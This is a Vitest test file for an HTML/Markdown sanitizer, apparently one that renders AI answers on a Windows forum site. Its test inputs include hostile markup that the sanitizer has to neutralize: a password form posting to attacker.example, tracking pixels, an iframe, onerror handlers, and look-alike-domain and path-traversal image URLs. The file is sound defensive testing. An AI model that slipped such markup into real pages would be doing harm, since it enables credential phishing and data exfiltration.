import { describe, expect, it } from 'vitest';
import { sanitizeAndParse } from '../utils/helpers';

describe('sanitizeAndParse security boundary', () => {
  it('renders hostile raw HTML as inert text and blocks attacker-controlled image requests', () => {
    const output = sanitizeAndParse(`
<form action="https://attacker.example/collect" style="position:fixed;inset:0">
  <input name="password">
  <button type="submit">Continue</button>
</form>
<iframe src="https://attacker.example/frame"></iframe>
<svg><a href="https://attacker.example/svg">click</a></svg>
<img src="https://attacker.example/tracker.png" style="position:fixed">

![tracking pixel](https://attacker.example/markdown-pixel.png)
`);

    const rendered = document.createElement('div');
    rendered.innerHTML = output;

    expect(rendered.querySelector('form, input, button, iframe, svg, img')).toBeNull();
    expect(rendered.querySelector('[style]')).toBeNull();
    expect(rendered.textContent).toContain('<form');
    expect(rendered.textContent).toContain('<img');
  });

  it('renders an approved raw HTML <img> from the CDN, whatever the attribute order', () => {
    const output = sanitizeAndParse(
      'Here is a walkthrough:\n\n'
      + '<img src="https://data.windowsforum.com/images/ai/answers/d19b05d42604.webp" alt="Animated walkthrough">\n\n'
      + '<img alt="Reversed order" src="https://windowsforum.com/images/ai/screenshots/x.png">'
    );
    const rendered = document.createElement('div');
    rendered.innerHTML = output;
    const images = [...rendered.querySelectorAll('img')];

    expect(images).toHaveLength(2);
    expect(images[0].getAttribute('src')).toBe('https://data.windowsforum.com/images/ai/answers/d19b05d42604.webp');
    expect(images[0].getAttribute('alt')).toBe('Animated walkthrough');
    expect(images[1].getAttribute('src')).toBe('https://windowsforum.com/images/ai/screenshots/x.png');
    // The approved raw <img> carries no style/on* handlers.
    expect(rendered.querySelector('[style], [onerror], [onload]')).toBeNull();
  });

  it('keeps a raw <img> from an unapproved origin or path inert (rendered as text)', () => {
    const output = sanitizeAndParse(
      '<img src="https://data.windowsforum.com.attacker.example/images/ai/answers/x.webp" alt="evil">\n\n'
      + '<img src="https://data.windowsforum.com/uploads/evil.webp" alt="wrong path">'
    );
    const rendered = document.createElement('div');
    rendered.innerHTML = output;

    // Lookalike origin and wrong path never render as an image element.
    expect(rendered.querySelector('img')).toBeNull();
    expect(rendered.textContent).toContain('<img');
  });

  it('approves any windowsforum.com subdomain but rejects look-alike hosts', () => {
    const output = sanitizeAndParse(
      '<img src="https://cdn.windowsforum.com/images/ai/answers/a.webp" alt="cdn">\n\n'
      + '<img src="https://media.eu.windowsforum.com/images/ai/screenshots/b.png" alt="nested">\n\n'
      + '<img src="https://windowsforum.com/images/ai/answers/c.webp" alt="apex">\n\n'
      + '<img src="https://notwindowsforum.com/images/ai/answers/d.webp" alt="suffix bypass">\n\n'
      + '<img src="https://windowsforum.com.attacker.example/images/ai/answers/e.webp" alt="prefix bypass">'
    );
    const rendered = document.createElement('div');
    rendered.innerHTML = output;
    const sources = [...rendered.querySelectorAll('img')].map(image => image.getAttribute('src'));

    expect(sources).toEqual([
      'https://cdn.windowsforum.com/images/ai/answers/a.webp',
      'https://media.eu.windowsforum.com/images/ai/screenshots/b.png',
      'https://windowsforum.com/images/ai/answers/c.webp',
    ]);
  });

  it('re-emits an approved raw <img> cleanly, dropping event-handler attributes', () => {
    const output = sanitizeAndParse(
      '<img src="https://data.windowsforum.com/images/ai/answers/x.webp" onerror="alert(1)" onload="x()">'
    );
    const rendered = document.createElement('div');
    rendered.innerHTML = output;
    const image = rendered.querySelector('img');

    // Approved src → the image renders, but only src/alt survive the rebuild.
    expect(image).not.toBeNull();
    expect(image?.getAttribute('src')).toBe('https://data.windowsforum.com/images/ai/answers/x.webp');
    expect(image?.getAttribute('onerror')).toBeNull();
    expect(image?.getAttribute('onload')).toBeNull();
  });

  it('preserves supported Markdown, safe links, citations, and approved AI images', () => {
    const output = sanitizeAndParse(`
**Bold** [OpenAI](https://openai.com/docs?q=chat)

| A | B |
| - | - |
| 1 | 2 |

\`\`\`ts
const answer = 42;
\`\`\`

[example.com](https://example.com/path_(nested))

https://windowsforum.com/images/ai/screenshots/example.webp

https://test.windowsforum.com/images/ai/answers/example.png
`);

    expect(output).toContain('<strong>Bold</strong>');
    expect(output).toContain('href="https://openai.com/docs?q=chat"');
    expect(output).toContain('<table>');
    expect(output).toContain('<code class="language-ts">');
    expect(output).toContain('Sources:');
    expect(output).toContain('href="https://example.com/path_(nested)"');
    expect(output).toContain('src="https://windowsforum.com/images/ai/screenshots/example.webp"');
    expect(output).toContain('src="https://test.windowsforum.com/images/ai/answers/example.png"');
  });

  it('extracts citations from Markdown tokens without rewriting code or duplicating sources', () => {
    const output = sanitizeAndParse(`
\`(not-a-source.example.com)\`

[example.com](https://example.com/path_(nested)) and [example.com](https://example.com/path_(nested)).

(docs.example.org/reference?q=chat)
`);
    const rendered = document.createElement('div');
    rendered.innerHTML = output;

    expect(rendered.querySelector('code')?.textContent).toBe('(not-a-source.example.com)');
    expect([...rendered.querySelectorAll('sup')].map(node => node.textContent)).toEqual(['[1]', '[1]', '[2]']);
    expect(rendered.querySelectorAll('a[href="https://example.com/path_(nested)"]')).toHaveLength(1);
    expect(rendered.querySelectorAll('a[href="https://docs.example.org/reference?q=chat"]')).toHaveLength(1);
  });

  it('allows image requests only to the exact approved origins and paths', () => {
    const output = sanitizeAndParse(`
![lookalike](https://windowsforum.com.attacker.example/images/ai/screenshots/pixel.png)
![insecure](http://windowsforum.com/images/ai/screenshots/pixel.png)
![traversal](https://windowsforum.com/images/ai/screenshots/../../pixel.png)
![data](data:image/svg+xml;base64,PHN2Zz4=)
![approved](https://windowsforum.com/images/ai/walkthroughs/step.jpg?v=2)
`);
    const rendered = document.createElement('div');
    rendered.innerHTML = output;
    const images = [...rendered.querySelectorAll('img')];

    expect(images).toHaveLength(1);
    expect(images[0].getAttribute('src')).toBe('https://windowsforum.com/images/ai/walkthroughs/step.jpg?v=2');
  });
});
